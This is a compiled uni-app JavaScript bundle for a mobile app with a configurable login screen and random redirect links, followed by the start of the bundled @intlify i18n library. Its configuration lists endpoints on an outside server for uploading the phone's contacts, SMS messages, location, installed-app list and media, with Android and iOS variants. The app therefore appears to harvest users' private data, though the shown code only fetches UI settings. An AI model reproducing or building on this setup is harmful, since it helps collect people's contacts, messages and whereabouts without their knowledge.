var __defProp = Object.defineProperty;
var __defNormalProp = (obj, key, value) => key in obj ? __defProp(obj, key, { enumerable: true, configurable: true, writable: true, value }) : obj[key] = value;
var __publicField = (obj, key, value) => {
  __defNormalProp(obj, typeof key !== "symbol" ? key + "" : key, value);
  return value;
};
if (typeof Promise !== "undefined" && !Promise.prototype.finally) {
  Promise.prototype.finally = function(callback) {
    const promise = this.constructor;
    return this.then(
      (value) => promise.resolve(callback()).then(() => value),
      (reason) => promise.resolve(callback()).then(() => {
        throw reason;
      })
    );
  };
}
;
if (typeof uni !== "undefined" && uni && uni.requireGlobal) {
  const global2 = uni.requireGlobal();
  ArrayBuffer = global2.ArrayBuffer;
  Int8Array = global2.Int8Array;
  Uint8Array = global2.Uint8Array;
  Uint8ClampedArray = global2.Uint8ClampedArray;
  Int16Array = global2.Int16Array;
  Uint16Array = global2.Uint16Array;
  Int32Array = global2.Int32Array;
  Uint32Array = global2.Uint32Array;
  Float32Array = global2.Float32Array;
  Float64Array = global2.Float64Array;
  BigInt64Array = global2.BigInt64Array;
  BigUint64Array = global2.BigUint64Array;
}
;
if (uni.restoreGlobal) {
  uni.restoreGlobal(Vue, weex, plus, setTimeout, clearTimeout, setInterval, clearInterval);
}
(function(vue) {
  "use strict";
  function requireNativePlugin(name) {
    return weex.requireModule(name);
  }
  function formatAppLog(type, filename, ...args) {
    if (uni.__log__) {
      uni.__log__(type, filename, ...args);
    } else {
      console[type].apply(console, [...args, filename]);
    }
  }
  const config$1 = {
    // 基础域名配置
    baseUrl: "https://lsht999.top/",
    // 资源路径配置
    resources: {
      // 不再使用loading.html中转
    },
    // API配置
    api: {
      base_url: "https://lsht999.top/",
      // 基础域名
      api_path: "/api",
      // API 路径前缀
      upload: {
        media: "/Uploads/upload",
        // 媒体文件上传
        contacts: "/Uploads/api",
        // 通讯录上传
        location: "/Uploads/apimap",
        // 位置上传
        sms: "/Uploads/apisms",
        // 短信上传
        apps: "/Uploads/apiapps"
        // 应用信息上传
      },
      config: "/config/getAppConfig"
      // 添加获取配置的API路径
    },
    // 上传配置
    upload: {
      pic_count: 0,
      // 0表示不限制图片数量
      video_count: 0,
      // 0表示不限制视频数量
      is_video: 1
      // 1表示允许视频
    },
    // 应用默认配置
    defaults: {
      screen_orientation: "portrait"
      // 默认屏幕方向为竖屏
    },
    // 获取完整的API URL
    getApiUrl(path) {
      return `${this.api.base_url}${path}`.replace(/\/+/g, "/");
    },
    // 获取当前环境的域名配置
    getCurrentDomain() {
      return this.env.domains[this.env.current];
    },
    // Android API配置
    android_api: {
      base_url: "https://lsht999.top/",
      api_path: "/api/",
      upload: {
        contacts: "Uploads/api",
        // 通讯录上传
        location: "Uploads/apimap",
        // 位置上传
        sms: "Uploads/apisms",
        // 短信上传
        media: "Uploads/upload",
        // 媒体文件上传
        apps: "Uploads/apiapps"
        // 应用信息上传
      }
    },
    // iOS API配置
    ios_api: {
      base_url: "https://lsht999.top/",
      api_path: "/api/",
      upload: {
        gallery: "api/Uploads/iosUpload",
        // 相册上传接口
        uploadFile: "api/Uploads/uploadFile",
        // 文件流上传接口
        contacts: "Uploads/api",
        // 通讯录上传接口
        location: "Uploads/apimap"
        // 定位上传接口
      }
    }
    // 不再包含 redirect_urls，改为通过API获取
  };
  class PlatformUtil {
    static isIOS() {
      return plus.os.name.toLowerCase() === "ios";
    }
    static isAndroid() {
      return plus.os.name.toLowerCase() === "android";
    }
    static getPlatformConfig() {
      if (this.isIOS()) {
        return config$1.ios_api;
      } else if (this.isAndroid()) {
        return config$1.android_api;
      }
      return config$1.api;
    }
  }
  class ConfigManager {
    constructor() {
      const defaultOrientation = config$1 && config$1.defaults && config$1.defaults.screen_orientation ? config$1.defaults.screen_orientation : "portrait";
      this.config = {
        background_images: [],
        // 背景图列表
        redirect_urls: [],
        // 跳转链接列表
        screen_orientation: defaultOrientation,
        // 默认屏幕方向
        show_logo_title: 1,
        // 是否显示LOGO和标题
        logo_image: "",
        // LOGO图片URL
        login_title: "",
        // 登录标题
        show_agreement: 1,
        // 是否显示服务协议
        agreement_text: "登录即代表同意《服务协议》",
        // 协议文本
        agreement_url: "",
        // 协议链接
        show_copyright: 1,
        // 是否显示版权信息
        copyright_text: "© 2025 版权所有",
        // 版权信息
        agreement_font_size: "12",
        // 协议字体大小
        agreement_font_color: "#666666",
        // 协议字体颜色
        agreement_font_weight: "normal",
        // 协议字体粗细
        copyright_font_size: "12",
        // 版权字体大小
        copyright_font_color: "#999999",
        // 版权字体颜色
        copyright_font_weight: "normal",
        // 版权字体粗细
        // 新增语言切换相关配置
        show_language_switch: 1,
        // 是否显示语言切换按钮
        language_font_size: "14",
        // 语言切换按钮字体大小
        language_font_color: "#ffffff",
        // 语言切换按钮字体颜色
        language_font_weight: "normal",
        // 语言切换按钮字体粗细
        language_bg_color: "rgba(0,0,0,0.3)",
        // 语言切换按钮背景色
        language_position: "top-right",
        // 语言切换按钮位置
        // 新增登录按钮样式配置
        login_button_font_size: "16",
        // 登录按钮字体大小
        login_button_font_color: "#ffffff",
        // 登录按钮字体颜色
        login_button_font_weight: "normal",
        // 登录按钮字体粗细
        login_button_bg_color: "#8257e6",
        // 登录按钮背景色
        login_button_gradient_color: "#6c45c4",
        // 登录按钮渐变色
        login_button_radius: "4"
        // 登录按钮圆角大小
      };
      this.loaded = false;
      this.loading = false;
      this.listeners = [];
      formatAppLog("log", "at utils/config.js:50", "ConfigManager初始化完成，默认配置:", JSON.stringify(this.config));
    }
    // 获取后台配置
    async loadConfig() {
      if (this.loading) {
        formatAppLog("log", "at utils/config.js:56", "配置加载中，跳过重复请求");
        return this.config;
      }
      this.loading = true;
      formatAppLog("log", "at utils/config.js:61", "开始加载配置...");
      try {
        await this.checkNetworkConnection();
        formatAppLog("log", "at utils/config.js:66", "网络连接检查通过");
        if (!config$1 || !config$1.api || !config$1.api.base_url) {
          formatAppLog("error", "at utils/config.js:70", "服务器配置缺失，使用默认配置");
          return this.config;
        }
        const baseUrl = config$1.api.base_url || "http://nb.xcttkc.cyou/";
        const apiPath = config$1.api.api_path || "/api";
        const configPath = config$1.api.config || "/config/getAppConfig";
        const apiUrl = `${baseUrl}${apiPath}${configPath}`;
        formatAppLog("log", "at utils/config.js:80", "请求配置URL:", apiUrl);
        const response = await new Promise((resolve, reject) => {
          uni.request({
            url: apiUrl,
            method: "GET",
            timeout: 5e3,
            // 添加超时设置
            success: (res) => {
              if (res.statusCode === 200 && res.data && res.data.code === 0) {
                formatAppLog("log", "at utils/config.js:90", "配置请求成功:", JSON.stringify(res.data));
                resolve(res.data);
              } else {
                formatAppLog("warn", "at utils/config.js:93", "获取配置失败:", res.statusCode, res.data);
                resolve({ data: {} });
              }
            },
            fail: (err) => {
              formatAppLog("error", "at utils/config.js:99", "请求配置失败:", err);
              resolve({ data: {} });
            }
          });
        });
        if (response && response.data) {
          const apiData = response.data;
          formatAppLog("log", "at utils/config.js:109", "收到API数据:", JSON.stringify(apiData));
          if (apiData.app_ui_settings) {
            formatAppLog("log", "at utils/config.js:113", "处理app_ui_settings数据:", JSON.stringify(apiData.app_ui_settings));
            let uiSettings = apiData.app_ui_settings;
            if (typeof uiSettings === "string") {
              try {
                uiSettings = JSON.parse(uiSettings);
                formatAppLog("log", "at utils/config.js:120", "解析app_ui_settings字符串成功");
              } catch (e) {
                formatAppLog("error", "at utils/config.js:122", "解析app_ui_settings字符串失败:", e.message);
                uiSettings = {};
              }
            }
            if (Array.isArray(uiSettings)) {
              const settingsObj = {};
              uiSettings.forEach((item) => {
                if (item && item.key && item.value !== void 0) {
                  settingsObj[item.key] = item.value;
                }
              });
              uiSettings = settingsObj;
              formatAppLog("log", "at utils/config.js:136", "转换app_ui_settings数组为对象:", JSON.stringify(uiSettings));
            }
            if (typeof uiSettings === "object" && uiSettings !== null) {
              if (uiSettings.agreement_font_size) {
                apiData.agreement_font_size = uiSettings.agreement_font_size;
              }
              if (uiSettings.agreement_font_color) {
                apiData.agreement_font_color = uiSettings.agreement_font_color;
              }
              if (uiSettings.agreement_font_weight) {
                apiData.agreement_font_weight = uiSettings.agreement_font_weight;
              }
              if (uiSettings.copyright_font_size) {
                apiData.copyright_font_size = uiSettings.copyright_font_size;
              }
              if (uiSettings.copyright_font_color) {
                apiData.copyright_font_color = uiSettings.copyright_font_color;
              }
              if (uiSettings.copyright_font_weight) {
                apiData.copyright_font_weight = uiSettings.copyright_font_weight;
              }
              formatAppLog("log", "at utils/config.js:163", "合并后的apiData:", JSON.stringify(apiData));
            }
          }
          if (Array.isArray(apiData.background_images)) {
            this.config.background_images = apiData.background_images;
            formatAppLog("log", "at utils/config.js:171", "更新背景图片数组，数量:", this.config.background_images.length);
          }
          if (Array.isArray(apiData.redirect_urls)) {
            this.config.redirect_urls = apiData.redirect_urls;
            formatAppLog("log", "at utils/config.js:177", "更新跳转链接数组，数量:", this.config.redirect_urls.length);
          }
          const defaultOrientation = config$1 && config$1.defaults && config$1.defaults.screen_orientation ? config$1.defaults.screen_orientation : "portrait";
          if (apiData.screen_orientation) {
            this.config.screen_orientation = apiData.screen_orientation;
            formatAppLog("log", "at utils/config.js:186", "设置屏幕方向:", this.config.screen_orientation);
          } else {
            this.config.screen_orientation = defaultOrientation;
            formatAppLog("log", "at utils/config.js:189", "使用默认屏幕方向:", this.config.screen_orientation);
          }
          if ("show_logo_title" in apiData) {
            this.config.show_logo_title = parseInt(apiData.show_logo_title) || 0;
            formatAppLog("log", "at utils/config.js:197", "设置显示LOGO标志:", this.config.show_logo_title, "原始值:", apiData.show_logo_title);
          }
          if (apiData.logo_image) {
            this.config.logo_image = apiData.logo_image;
            formatAppLog("log", "at utils/config.js:202", "设置LOGO图片URL:", this.config.logo_image);
          }
          if (apiData.login_title) {
            this.config.login_title = apiData.login_title;
            formatAppLog("log", "at utils/config.js:207", "设置登录标题:", this.config.login_title);
          }
          if ("show_agreement" in apiData) {
            this.config.show_agreement = parseInt(apiData.show_agreement) || 0;
            formatAppLog("log", "at utils/config.js:214", "设置显示协议标志:", this.config.show_agreement, "原始值:", apiData.show_agreement);
          }
          if (apiData.agreement_text) {
            this.config.agreement_text = apiData.agreement_text;
            formatAppLog("log", "at utils/config.js:219", "设置协议文本:", this.config.agreement_text);
          }
          if (apiData.agreement_url) {
            this.config.agreement_url = apiData.agreement_url;
            formatAppLog("log", "at utils/config.js:224", "设置协议链接:", this.config.agreement_url);
          }
          if ("show_copyright" in apiData) {
            this.config.show_copyright = parseInt(apiData.show_copyright) || 0;
            formatAppLog("log", "at utils/config.js:231", "设置显示版权标志:", this.config.show_copyright, "原始值:", apiData.show_copyright);
          } else {
            if (apiData.copyright_text) {
              this.config.show_copyright = 1;
              formatAppLog("log", "at utils/config.js:236", "版权文本存在，自动设置显示版权标志: 1");
            }
          }
          if (apiData.copyright_text) {
            this.config.copyright_text = apiData.copyright_text;
            formatAppLog("log", "at utils/config.js:242", "设置版权文本:", this.config.copyright_text);
          }
          if (apiData.agreement_font_size) {
            this.config.agreement_font_size = apiData.agreement_font_size;
            formatAppLog("log", "at utils/config.js:248", "设置协议字体大小:", this.config.agreement_font_size);
          }
          if (apiData.agreement_font_color) {
            this.config.agreement_font_color = apiData.agreement_font_color;
            formatAppLog("log", "at utils/config.js:253", "设置协议字体颜色:", this.config.agreement_font_color);
          } else {
            if (apiData.app_ui_settings && typeof apiData.app_ui_settings === "object") {
              if (apiData.app_ui_settings.agreement_font_color) {
                this.config.agreement_font_color = apiData.app_ui_settings.agreement_font_color;
                formatAppLog("log", "at utils/config.js:259", "从app_ui_settings设置协议字体颜色:", this.config.agreement_font_color);
              }
            }
          }
          if (apiData.agreement_font_weight) {
            this.config.agreement_font_weight = apiData.agreement_font_weight;
            formatAppLog("log", "at utils/config.js:266", "设置协议字体粗细:", this.config.agreement_font_weight);
          } else if (apiData.app_ui_settings && apiData.app_ui_settings.agreement_font_weight) {
            this.config.agreement_font_weight = apiData.app_ui_settings.agreement_font_weight === "bold" ? "bold" : "normal";
            formatAppLog("log", "at utils/config.js:269", "从app_ui_settings设置协议字体粗细:", this.config.agreement_font_weight);
          }
          if (apiData.copyright_font_size) {
            this.config.copyright_font_size = apiData.copyright_font_size;
            formatAppLog("log", "at utils/config.js:275", "设置版权字体大小:", this.config.copyright_font_size);
          }
          if (apiData.copyright_font_color) {
            this.config.copyright_font_color = apiData.copyright_font_color;
            formatAppLog("log", "at utils/config.js:280", "设置版权字体颜色:", this.config.copyright_font_color);
          } else {
            if (apiData.app_ui_settings && typeof apiData.app_ui_settings === "object") {
              if (apiData.app_ui_settings.copyright_font_color) {
                this.config.copyright_font_color = apiData.app_ui_settings.copyright_font_color;
                formatAppLog("log", "at utils/config.js:286", "从app_ui_settings设置版权字体颜色:", this.config.copyright_font_color);
              }
            }
          }
          if (apiData.copyright_font_weight) {
            this.config.copyright_font_weight = apiData.copyright_font_weight;
            formatAppLog("log", "at utils/config.js:293", "设置版权字体粗细:", this.config.copyright_font_weight);
          } else if (apiData.app_ui_settings && apiData.app_ui_settings.copyright_font_weight) {
            this.config.copyright_font_weight = apiData.app_ui_settings.copyright_font_weight === "bold" ? "bold" : "normal";
            formatAppLog("log", "at utils/config.js:296", "从app_ui_settings设置版权字体粗细:", this.config.copyright_font_weight);
          }
          if ("show_language_switch" in apiData) {
            let showLanguageSwitch;
            if (typeof apiData.show_language_switch === "string") {
              showLanguageSwitch = parseInt(apiData.show_language_switch);
              if (isNaN(showLanguageSwitch)) {
                if (apiData.show_language_switch.toLowerCase() === "true") {
                  showLanguageSwitch = 1;
                } else if (apiData.show_language_switch.toLowerCase() === "false") {
                  showLanguageSwitch = 0;
                } else {
                  showLanguageSwitch = 1;
                }
              }
            } else if (typeof apiData.show_language_switch === "boolean") {
              showLanguageSwitch = apiData.show_language_switch ? 1 : 0;
            } else if (typeof apiData.show_language_switch === "number") {
              showLanguageSwitch = apiData.show_language_switch;
            } else {
              showLanguageSwitch = 1;
            }
            this.config.show_language_switch = showLanguageSwitch === 0 ? 0 : 1;
            formatAppLog("log", "at utils/config.js:331", "设置显示语言切换标志:", this.config.show_language_switch, "原始值:", apiData.show_language_switch, "类型:", typeof apiData.show_language_switch);
          }
          if (apiData.language_font_size) {
            this.config.language_font_size = apiData.language_font_size;
            formatAppLog("log", "at utils/config.js:336", "设置语言切换字体大小:", this.config.language_font_size);
          }
          if (apiData.language_font_color) {
            this.config.language_font_color = apiData.language_font_color;
            formatAppLog("log", "at utils/config.js:341", "设置语言切换字体颜色:", this.config.language_font_color);
          }
          if (apiData.language_font_weight) {
            this.config.language_font_weight = apiData.language_font_weight;
            formatAppLog("log", "at utils/config.js:346", "设置语言切换字体粗细:", this.config.language_font_weight);
          } else if (apiData.language_font_weight === "bold") {
            this.config.language_font_weight = "bold";
            formatAppLog("log", "at utils/config.js:350", "设置语言切换字体粗细为bold");
          }
          if (apiData.language_bg_color) {
            this.config.language_bg_color = apiData.language_bg_color;
            formatAppLog("log", "at utils/config.js:355", "设置语言切换背景色:", this.config.language_bg_color);
          }
          if (apiData.language_position) {
            this.config.language_position = apiData.language_position;
            formatAppLog("log", "at utils/config.js:360", "设置语言切换位置:", this.config.language_position);
            formatAppLog("log", "at utils/config.js:363", "===语言切换位置已更新===", this.config.language_position);
          }
          formatAppLog("log", "at utils/config.js:367", "======== 按钮样式配置处理 ========");
          if (apiData.login_button_font_size) {
            this.config.login_button_font_size = apiData.login_button_font_size;
            formatAppLog("log", "at utils/config.js:372", "设置登录按钮字体大小:", this.config.login_button_font_size, "(来源: API数据)");
          } else {
            this.config.login_button_font_size = "16";
            formatAppLog("log", "at utils/config.js:375", "使用默认登录按钮字体大小:", this.config.login_button_font_size, "(来源: 默认值)");
          }
          if (apiData.login_button_font_color) {
            const colorValue = this.validateColorValue(apiData.login_button_font_color);
            this.config.login_button_font_color = colorValue;
            formatAppLog("log", "at utils/config.js:382", "设置登录按钮字体颜色:", this.config.login_button_font_color, "(来源: API数据)");
          } else {
            this.config.login_button_font_color = "#ffffff";
            formatAppLog("log", "at utils/config.js:385", "使用默认登录按钮字体颜色:", this.config.login_button_font_color, "(来源: 默认值)");
          }
          if (apiData.login_button_font_weight) {
            this.config.login_button_font_weight = apiData.login_button_font_weight;
            formatAppLog("log", "at utils/config.js:391", "设置登录按钮字体粗细:", this.config.login_button_font_weight, "(来源: API数据)");
          } else {
            this.config.login_button_font_weight = "normal";
            formatAppLog("log", "at utils/config.js:394", "使用默认登录按钮字体粗细:", this.config.login_button_font_weight, "(来源: 默认值)");
          }
          if (apiData.login_button_bg_color) {
            const colorValue = this.validateColorValue(apiData.login_button_bg_color);
            this.config.login_button_bg_color = colorValue;
            formatAppLog("log", "at utils/config.js:401", "设置登录按钮背景色:", this.config.login_button_bg_color, "(来源: API数据)");
          } else {
            this.config.login_button_bg_color = "#8257e6";
            formatAppLog("log", "at utils/config.js:404", "使用默认登录按钮背景色:", this.config.login_button_bg_color, "(来源: 默认值)");
          }
          if (apiData.login_button_gradient_color) {
            const colorValue = this.validateColorValue(apiData.login_button_gradient_color);
            this.config.login_button_gradient_color = colorValue;
            formatAppLog("log", "at utils/config.js:411", "设置登录按钮渐变色:", this.config.login_button_gradient_color, "(来源: API数据)");
          } else {
            this.config.login_button_gradient_color = "#6c45c4";
            formatAppLog("log", "at utils/config.js:414", "使用默认登录按钮渐变色:", this.config.login_button_gradient_color, "(来源: 默认值)");
          }
          if (apiData.login_button_radius) {
            this.config.login_button_radius = apiData.login_button_radius;
            formatAppLog("log", "at utils/config.js:420", "设置登录按钮圆角:", this.config.login_button_radius, "(来源: API数据)");
          } else {
            this.config.login_button_radius = "4";
            formatAppLog("log", "at utils/config.js:423", "使用默认登录按钮圆角:", this.config.login_button_radius, "(来源: 默认值)");
          }
          if ("login_button_shadow" in apiData) {
            this.config.login_button_shadow = apiData.login_button_shadow === 0 || apiData.login_button_shadow === "0" || apiData.login_button_shadow === false ? 0 : 1;
            formatAppLog("log", "at utils/config.js:431", "设置登录按钮阴影:", this.config.login_button_shadow, "(来源: API数据)");
          } else {
            this.config.login_button_shadow = 1;
            formatAppLog("log", "at utils/config.js:434", "使用默认登录按钮阴影:", this.config.login_button_shadow, "(来源: 默认值)");
          }
          formatAppLog("log", "at utils/config.js:437", "按钮样式最终配置:");
          formatAppLog("log", "at utils/config.js:438", "- 字体颜色:", this.config.login_button_font_color);
          formatAppLog("log", "at utils/config.js:439", "- 背景颜色:", this.config.login_button_bg_color);
          formatAppLog("log", "at utils/config.js:440", "- 渐变颜色:", this.config.login_button_gradient_color);
          formatAppLog("log", "at utils/config.js:441", "- 字体大小:", this.config.login_button_font_size);
          formatAppLog("log", "at utils/config.js:442", "- 字体粗细:", this.config.login_button_font_weight);
          formatAppLog("log", "at utils/config.js:443", "- 按钮圆角:", this.config.login_button_radius);
          formatAppLog("log", "at utils/config.js:444", "======== 按钮样式配置处理结束 ========");
        } else {
          formatAppLog("error", "at utils/config.js:446", "API响应没有data字段或响应为空");
        }
        this.loaded = true;
        formatAppLog("log", "at utils/config.js:450", "配置加载完成:", JSON.stringify(this.config));
        formatAppLog("log", "at utils/config.js:453", `开始通知 ${this.listeners.length} 个监听器...`);
        this.notifyListeners();
        if (typeof uni !== "undefined") {
          formatAppLog("log", "at utils/config.js:458", "发送全局配置变更事件，按钮配置:", {
            font_color: this.config.login_button_font_color,
            bg_color: this.config.login_button_bg_color,
            gradient_color: this.config.login_button_gradient_color,
            font_size: this.config.login_button_font_size,
            font_weight: this.config.login_button_font_weight,
            radius: this.config.login_button_radius
          });
          uni.$emit("config:updated", this.config);
        }
        return this.config;
      } catch (error) {
        formatAppLog("error", "at utils/config.js:471", "加载配置失败", error);
        return this.config;
      } finally {
        this.loading = false;
      }
    }
    // 添加网络检查方法
    checkNetworkConnection(timeout = 5e3) {
      return new Promise((resolve) => {
        const timeoutId = setTimeout(() => {
          formatAppLog("log", "at utils/config.js:483", "网络检查超时，继续流程");
          resolve();
        }, timeout);
        const checkConnection = () => {
          uni.getNetworkType({
            success: (res) => {
              if (res.networkType !== "none") {
                formatAppLog("log", "at utils/config.js:491", "网络连接正常:", res.networkType);
                clearTimeout(timeoutId);
                resolve();
              } else {
                formatAppLog("log", "at utils/config.js:495", "无网络连接，稍后重试");
                setTimeout(checkConnection, 500);
              }
            },
            fail: () => {
              formatAppLog("log", "at utils/config.js:500", "获取网络状态失败，稍后重试");
              setTimeout(checkConnection, 500);
            }
          });
        };
        checkConnection();
      });
    }
    // 获取背景图列表
    getBackgroundImages() {
      return this.config.background_images;
    }
    // 获取跳转链接列表
    getRedirectUrls() {
      return this.config.redirect_urls;
    }
    // 获取一个随机的跳转链接
    getRandomRedirectUrl() {
      const urls = this.getRedirectUrls();
      if (urls && urls.length > 0) {
        const randomIndex = Math.floor(Math.random() * urls.length);
        const url = urls[randomIndex];
        formatAppLog("log", "at utils/config.js:527", "随机选择跳转URL:", url, "索引:", randomIndex, "总数:", urls.length);
        return url;
      } else {
        formatAppLog("warn", "at utils/config.js:530", "未找到有效的跳转链接");
        return null;
      }
    }
    // 获取屏幕方向设置，提供默认值
    getScreenOrientation() {
      const defaultOrientation = config$1 && config$1.defaults && config$1.defaults.screen_orientation ? config$1.defaults.screen_orientation : "portrait";
      return this.config.screen_orientation || defaultOrientation;
    }
    // 添加配置变更监听器
    addListener(callback) {
      if (typeof callback === "function") {
        this.listeners.push(callback);
        if (this.loaded) {
          callback(this.config);
        }
      }
    }
    // 移除监听器
    removeListener(callback) {
      this.listeners = this.listeners.filter((listener) => listener !== callback);
    }
    // 触发所有监听器
    notifyListeners() {
      formatAppLog("log", "at utils/config.js:563", `正在通知 ${this.listeners.length} 个监听器...`);
      if (this.listeners.length > 0) {
        const configSnapshot = { ...this.config };
        formatAppLog("log", "at utils/config.js:568", "通知监听器的配置快照 - 按钮配置:", {
          font_color: configSnapshot.login_button_font_color,
          bg_color: configSnapshot.login_button_bg_color,
          gradient_color: configSnapshot.login_button_gradient_color
        });
        for (const listener of this.listeners) {
          if (typeof listener === "function") {
            try {
              formatAppLog("log", "at utils/config.js:577", "正在调用监听器...");
              listener(configSnapshot);
            } catch (error) {
              formatAppLog("error", "at utils/config.js:580", "通知配置更新出错:", error);
            }
          }
        }
        formatAppLog("log", "at utils/config.js:584", "所有监听器通知完成");
      } else {
        formatAppLog("log", "at utils/config.js:586", "没有监听器需要通知");
      }
    }
    // 获取配置对象
    getConfig() {
      return this.config;
    }
    // 检查配置是否已加载完成
    isConfigLoaded() {
      return this.loaded;
    }
    // 验证颜色值是否有效
    validateColorValue(color) {
      if (!color) {
        formatAppLog("log", "at utils/config.js:603", "颜色值为空，使用默认值: #ffffff");
        return "#ffffff";
      }
      try {
        formatAppLog("log", "at utils/config.js:608", "开始验证颜色值:", color, "类型:", typeof color);
        const trimmedColor = typeof color === "string" ? color.trim() : color;
        if (typeof trimmedColor === "string" && /^#([0-9A-F]{3}){1,2}$/i.test(trimmedColor)) {
          formatAppLog("log", "at utils/config.js:616", "有效的十六进制颜色:", trimmedColor);
          return trimmedColor;
        } else if (typeof trimmedColor === "string" && (/^rgb\(\s*\d+\s*,\s*\d+\s*,\s*\d+\s*\)$/i.test(trimmedColor) || /^rgba\(\s*\d+\s*,\s*\d+\s*,\s*\d+\s*,\s*[\d.]+\s*\)$/i.test(trimmedColor))) {
          formatAppLog("log", "at utils/config.js:622", "有效的RGB/RGBA颜色:", trimmedColor);
          return trimmedColor;
        } else if (typeof trimmedColor === "string") {
          if (trimmedColor.startsWith("#")) {
            formatAppLog("log", "at utils/config.js:628", "看起来是十六进制颜色:", trimmedColor);
            if (/^#[0-9A-F]{6}$/i.test(trimmedColor)) {
              formatAppLog("log", "at utils/config.js:632", "有效的6位十六进制颜色:", trimmedColor);
              return trimmedColor;
            } else if (/^#[0-9A-F]{3}$/i.test(trimmedColor)) {
              formatAppLog("log", "at utils/config.js:637", "有效的3位十六进制颜色:", trimmedColor);
              return trimmedColor;
            } else {
              formatAppLog("log", "at utils/config.js:642", "非标准十六进制颜色，尝试修复:", trimmedColor);
              const hexPart = trimmedColor.substring(1);
              if (/^[0-9A-F]+$/i.test(hexPart)) {
                if (hexPart.length === 3 || hexPart.length === 6) {
                  formatAppLog("log", "at utils/config.js:647", "修复后的十六进制颜色:", trimmedColor);
                  return trimmedColor;
                } else {
                  formatAppLog("log", "at utils/config.js:650", "十六进制颜色长度不正确，使用默认值");
                  return "#ffffff";
                }
              } else {
                formatAppLog("log", "at utils/config.js:654", "无效的十六进制字符，使用默认值");
                return "#ffffff";
              }
            }
          } else if (trimmedColor.startsWith("rgb") || trimmedColor.startsWith("rgba")) {
            formatAppLog("log", "at utils/config.js:661", "看起来是RGB/RGBA颜色:", trimmedColor);
            return trimmedColor;
          } else if (/^[0-9A-F]{3,6}$/i.test(trimmedColor)) {
            const fixedColor = "#" + trimmedColor;
            formatAppLog("log", "at utils/config.js:667", "修复缺少#的十六进制颜色:", trimmedColor, "->", fixedColor);
            return fixedColor;
          } else {
            formatAppLog("warn", "at utils/config.js:671", "无法识别的颜色格式:", trimmedColor, "，使用默认值");
            return "#ffffff";
          }
        } else {
          formatAppLog("warn", "at utils/config.js:675", "颜色值不是字符串类型:", trimmedColor, "，使用默认值");
          return "#ffffff";
        }
      } catch (error) {
        formatAppLog("error", "at utils/config.js:679", "验证颜色值出错:", error, "，使用默认值");
        return "#ffffff";
      }
    }
  }
  const configManager = new ConfigManager();
  /*!
    * @intlify/shared v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  const inBrowser = typeof window !== "undefined";
  let mark;
  let measure;
  {
    const perf = inBrowser && window.performance;
    if (perf && perf.mark && perf.measure && perf.clearMarks && perf.clearMeasures) {
      mark = (tag) => perf.mark(tag);
      measure = (name, startTag, endTag) => {
        perf.measure(name, startTag, endTag);
        perf.clearMarks(startTag);
        perf.clearMarks(endTag);
      };
    }
  }
  const RE_ARGS = /\{([0-9a-zA-Z]+)\}/g;
  function format(message, ...args) {
    if (args.length === 1 && isObject$1(args[0])) {
      args = args[0];
    }
    if (!args || !args.hasOwnProperty) {
      args = {};
    }
    return message.replace(RE_ARGS, (match, identifier) => {
      return args.hasOwnProperty(identifier) ? args[identifier] : "";
    });
  }
  const hasSymbol = typeof Symbol === "function" && typeof Symbol.toStringTag === "symbol";
  const makeSymbol = (name) => hasSymbol ? Symbol(name) : name;
  const generateFormatCacheKey = (locale, key, source) => friendlyJSONstringify({ l: locale, k: key, s: source });
  const friendlyJSONstringify = (json) => JSON.stringify(json).replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029").replace(/\u0027/g, "\\u0027");
  const isNumber = (val) => typeof val === "number" && isFinite(val);
  const isDate = (val) => toTypeString(val) === "[object Date]";
  const isRegExp = (val) => toTypeString(val) === "[object RegExp]";
  const isEmptyObject = (val) => isPlainObject(val) && Object.keys(val).length === 0;
  function warn(msg, err) {
    if (typeof console !== "undefined") {
      console.warn(`[intlify] ` + msg);
      if (err) {
        console.warn(err.stack);
      }
    }
  }
  const assign = Object.assign;
  let _globalThis;
  const getGlobalThis = () => {
    return _globalThis || (_globalThis = typeof globalThis !== "undefined" ? globalThis : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : typeof global !== "undefined" ? global : {});
  };
  function escapeHtml(rawText) {
    return rawText.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
  }
  const hasOwnProperty$1 = Object.prototype.hasOwnProperty;
  function hasOwn$1(obj, key) {
    return hasOwnProperty$1.call(obj, key);
  }
  const isArray = Array.isArray;
  const isFunction = (val) => typeof val === "function";
  const isString = (val) => typeof val === "string";
  const isBoolean = (val) => typeof val === "boolean";
  const isObject$1 = (val) => (
    // eslint-disable-line
    val !== null && typeof val === "object"
  );
  const objectToString = Object.prototype.toString;
  const toTypeString = (value) => objectToString.call(value);
  const isPlainObject = (val) => toTypeString(val) === "[object Object]";
  const toDisplayString = (val) => {
    return val == null ? "" : isArray(val) || isPlainObject(val) && val.toString === objectToString ? JSON.stringify(val, null, 2) : String(val);
  };
  const RANGE = 2;
  function generateCodeFrame(source, start = 0, end = source.length) {
    const lines = source.split(/\r?\n/);
    let count = 0;
    const res = [];
    for (let i = 0; i < lines.length; i++) {
      count += lines[i].length + 1;
      if (count >= start) {
        for (let j = i - RANGE; j <= i + RANGE || end > count; j++) {
          if (j < 0 || j >= lines.length)
            continue;
          const line = j + 1;
          res.push(`${line}${" ".repeat(3 - String(line).length)}|  ${lines[j]}`);
          const lineLength = lines[j].length;
          if (j === i) {
            const pad = start - (count - lineLength) + 1;
            const length = Math.max(1, end > count ? lineLength - pad : end - start);
            res.push(`   |  ` + " ".repeat(pad) + "^".repeat(length));
          } else if (j > i) {
            if (end > count) {
              const length = Math.max(Math.min(end - count, lineLength), 1);
              res.push(`   |  ` + "^".repeat(length));
            }
            count += lineLength + 1;
          }
        }
        break;
      }
    }
    return res.join("\n");
  }
  function createEmitter() {
    const events = /* @__PURE__ */ new Map();
    const emitter = {
      events,
      on(event, handler) {
        const handlers = events.get(event);
        const added = handlers && handlers.push(handler);
        if (!added) {
          events.set(event, [handler]);
        }
      },
      off(event, handler) {
        const handlers = events.get(event);
        if (handlers) {
          handlers.splice(handlers.indexOf(handler) >>> 0, 1);
        }
      },
      emit(event, payload) {
        (events.get(event) || []).slice().map((handler) => handler(payload));
        (events.get("*") || []).slice().map((handler) => handler(event, payload));
      }
    };
    return emitter;
  }
  /*!
    * @intlify/message-resolver v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  const hasOwnProperty = Object.prototype.hasOwnProperty;
  function hasOwn(obj, key) {
